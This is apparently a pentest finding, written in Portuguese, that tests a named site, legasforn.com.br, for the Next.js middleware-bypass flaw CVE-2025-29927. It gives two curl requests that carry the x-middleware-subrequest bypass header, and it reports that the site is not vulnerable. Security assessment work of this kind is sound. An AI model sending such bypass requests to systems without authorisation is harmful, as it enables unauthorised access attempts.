# F-010 Ausência de Vulnerabilidade no Next.js CVE-2025-29927

**Alvo:** legasforn.com.br
**Severidade:** Info (não vulnerável)
**Timestamp:** 2026-08-24T18:25:00Z

## Teste
O CVE-2025-29927 é uma vulnerabilidade no Next.js que permite bypass de middleware via header `x-middleware-subrequest`. Testamos em dois cenários:

### Cenário 1: API endpoint
```bash
curl -s "https://legasforn.com.br/api/v1/accounts?game=fortnite&perPage=1" \
  -H "Authorization: Bearer {token}" \
  -H "x-middleware-subrequest: middleware"
```
**Resultado:** Resposta idêntica à requisição sem o header. Autenticação continua sendo verificada.

### Cenário 2: Dashboard (rota protegida)
```bash
curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "https://legasforn.com.br/dashboard" \
  -H "Authorization: Bearer {token}" \
  -H "x-middleware-subrequest: middleware"
```
**Resultado:** 307 redirect para `/auth/login?redirect=/dashboard`. Middleware não foi bypassado.

## Conclusão
O Next.js utilizado pelo legasforn.com.br **NÃO** é vulnerável ao CVE-2025-29927. O middleware de autenticação continua funcionando corretamente mesmo com o header de bypass.
